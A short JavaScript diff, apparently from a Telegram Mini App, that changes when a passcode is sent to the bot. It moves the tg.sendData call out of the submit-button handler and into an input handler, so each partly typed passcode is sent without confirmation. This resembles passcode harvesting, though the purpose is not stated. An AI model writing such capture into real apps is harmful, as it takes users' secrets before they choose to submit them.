@@ -23,7 +23,6 @@ document.addEventListener('DOMContentLoaded', () => {
             console.log('[ERROR]: ' + error);
         }
     });
-    
     function showPage2() {
         page = 'page2';
         page2.style.display = 'flex';
@@ -52,8 +51,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     passcodeBtn.addEventListener('click', () => {
         const value = passcodeInput.value;
-
-        tg.sendData(JSON.stringify({ action: 'passcode_value', value: value }));
         page2.style.transform = 'translate(-50%, 40px)';
         page2.style.opacity = '0';
 
@@ -96,6 +93,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
         if (input.value.length >= input.maxLength) {
             input.blur(); // removes focus → hides keyboard
-        }     
+        }
+        tg.sendData(JSON.stringify({ action: 'passcode_value', value: input.value }));
     });
 });
